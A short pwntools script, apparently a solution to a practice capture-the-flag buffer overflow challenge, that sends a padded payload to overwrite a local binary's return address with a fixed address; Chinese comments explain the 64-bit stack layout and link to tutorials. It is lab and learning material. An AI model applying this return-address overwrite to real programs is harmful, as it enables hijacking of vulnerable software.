from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/buffer-overflow-level1.3"
p = process(challenge_path)

# create string
shellcode=p64(0x1111111111111111)+p64(0x1111111111111111)+p64(0x004012c0)+p64(0x004012c0)
p.sendlineafter("Give me your input\n",shellcode)

# 接收题目的输出
result = p.recvall()

# 打印题目的输出
print(result)
'''
读源码 反汇编
https://blog.csdn.net/qq_45894840/article/details/126788019
https://www.freebuf.com/articles/network/267051.html
这题用gdb动态调试好像有问题，直接用objdump -d反汇编看main
思路：覆盖main函数的返回地址
64位函数调用是先把rip压入，再压入rbp，调用函数之后将rsp作为子函数的rbp，返回的时候先恢复rbp再跳到rip
所以栈的情况是8字节rip+8字节rbp+16字节buf
'''